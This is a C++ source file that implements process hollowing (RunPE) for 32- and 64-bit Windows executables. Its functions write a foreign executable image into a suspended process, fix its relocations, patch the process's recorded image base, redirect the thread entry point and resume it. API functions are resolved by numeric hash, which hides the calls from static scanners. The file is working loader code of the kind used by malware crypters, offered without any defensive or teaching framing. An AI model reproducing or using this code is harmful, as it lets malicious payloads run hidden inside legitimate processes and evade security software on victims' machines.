#include "pe.hpp"
#include "reloc.hpp"

/**
 * Function to check if the image is a valid PE file.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is a valid PE else no.
 */
BOOL IsValidPE(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
		return TRUE;

	return FALSE;
}

/**
 * Function to check if the image is a x86 executable.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is x86 else FALSE.
 */
BOOL IsPE32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		return TRUE;

	return FALSE;
}

/**
 * Function to write the new PE image and resume the process thread x86.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	// VirtualAllocEx
	m_VirtualAllocExPtr virtualAllocEx = (m_VirtualAllocExPtr)m_GetProcAddressEx("kernel32.dll", 448715884);
	lpAllocAddress = virtualAllocEx(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		// printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	// printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	// WriteProcessMemory
	m_WriteProcessMemoryPtr writeProcessMemory = (m_WriteProcessMemoryPtr)m_GetProcAddressEx("kernel32.dll", 292629008);
	const BOOL bWriteHeaders = writeProcessMemory(lpPI->hProcess, lpAllocAddress, (LPVOID)lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		// printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	// printf("[+] Headers write at : 0x%p\n", (LPVOID)(DWORD64)lpImageNTHeader32->OptionalHeader.ImageBase);

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = writeProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			// printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		// printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	m_wow64GetThreadContextPtr wow64GetThreadContext = (m_wow64GetThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 965724701);
	const BOOL bGetContext = wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		// printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = writeProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		// printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	m_wow64SetThreadContextPtr wow64SetThreadContext = (m_wow64SetThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 309274506);
	const BOOL bSetContext = wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		// printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	m_resumeThreadPtr resumeThread = (m_resumeThreadPtr)m_GetProcAddressEx("kernel32.dll", 910532615);
	resumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to write the new PE image and resume the process thread x64.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	// VirtualAllocEx
	m_VirtualAllocExPtr virtualAllocEx = (m_VirtualAllocExPtr)m_GetProcAddressEx("kernel32.dll", 448715884);
	lpAllocAddress = virtualAllocEx(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		// printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	// printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);
	// WriteProcessMemory
	m_WriteProcessMemoryPtr writeProcessMemory = (m_WriteProcessMemoryPtr)m_GetProcAddressEx("kernel32.dll", 292629008);
	const BOOL bWriteHeaders = writeProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		// printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	// printf("[+] Headers write at : 0x%p\n", (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase);

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = writeProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			// printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		// printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	m_getThreadContextPtr getThreadContext = (m_getThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 981130953);
	const BOOL bGetContext = getThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		// printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = writeProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		// printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	m_setThreadContextPtr setThreadContext = (m_setThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 981130965);
	const BOOL bSetContext = setThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		// printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	m_resumeThreadPtr resumeThread = (m_resumeThreadPtr)m_GetProcAddressEx("kernel32.dll", 910532615);
	resumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to fix relocation table and write the new PE image and resume the process thread x86.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	// VirtualAllocEx
	m_VirtualAllocExPtr virtualAllocEx = (m_VirtualAllocExPtr)m_GetProcAddressEx("kernel32.dll", 448715884);
	lpAllocAddress = virtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		// printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	// printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const DWORD DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader32->OptionalHeader.ImageBase;

	// WriteProcessMemory
	lpImageNTHeader32->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	m_WriteProcessMemoryPtr writeProcessMemory = (m_WriteProcessMemoryPtr)m_GetProcAddressEx("kernel32.dll", 292629008);
	const BOOL bWriteHeaders = writeProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		// printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	// printf("[+] Headers write at : 0x%p\n", lpAllocAddress);

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress32(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = writeProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			// printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		// printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	if (lpImageRelocSection == nullptr)
	{
		// printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
		return FALSE;
	}

	// printf("[+] Relocation section : %s\n", (char *)lpImageRelocSection->Name);

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD PatchedAddress = 0;
			// ReadProcessMemory
			m_ReadProcessMemoryPtr readProcessMemory = (m_ReadProcessMemoryPtr)m_GetProcAddressEx("kernel32.dll", 848101123);
			readProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

			PatchedAddress += DeltaImageBase;

			writeProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);
		}
	}

	// printf("[+] Relocations done.\n");

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	m_wow64GetThreadContextPtr wow64GetThreadContext = (m_wow64GetThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 965724701);
	const BOOL bGetContext = wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		// printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = writeProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		// printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	m_wow64SetThreadContextPtr wow64SetThreadContext = (m_wow64SetThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 309274506);
	const BOOL bSetContext = wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		// printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	m_resumeThreadPtr resumeThread = (m_resumeThreadPtr)m_GetProcAddressEx("kernel32.dll", 910532615);
	resumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to fix relocation table and write the new PE image and resume the process thread x64.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	// VirtualAllocEx
	m_VirtualAllocExPtr virtualAllocEx = (m_VirtualAllocExPtr)m_GetProcAddressEx("kernel32.dll", 448715884);
	lpAllocAddress = virtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		// printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	// printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const DWORD64 DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader64->OptionalHeader.ImageBase;

	lpImageNTHeader64->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	// WriteProcessMemory
	m_WriteProcessMemoryPtr writeProcessMemory = (m_WriteProcessMemoryPtr)m_GetProcAddressEx("kernel32.dll", 292629008);
	const BOOL bWriteHeaders = writeProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		// printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	// printf("[+] Headers write at : 0x%p\n", lpAllocAddress);

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress64(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = writeProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			// printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		// printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	if (lpImageRelocSection == nullptr)
	{
		// printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
		return FALSE;
	}

	// printf("[+] Relocation section : %s\n", (char *)lpImageRelocSection->Name);

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD64 PatchedAddress = 0;
			// ReadProcessMemory
			m_ReadProcessMemoryPtr readProcessMemory = (m_ReadProcessMemoryPtr)m_GetProcAddressEx("kernel32.dll", 848101123);
			readProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

			PatchedAddress += DeltaImageBase;

			writeProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);
		}
	}

	// printf("[+] Relocations done.\n");

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	m_getThreadContextPtr getThreadContext = (m_getThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 981130953);
	const BOOL bGetContext = getThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		// printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = writeProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		// printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	m_setThreadContextPtr setThreadContext = (m_setThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 981130965);
	const BOOL bSetContext = setThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		// printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	m_resumeThreadPtr resumeThread = (m_resumeThreadPtr)m_GetProcAddressEx("kernel32.dll", 910532615);
	resumeThread(lpPI->hThread);

	return TRUE;
}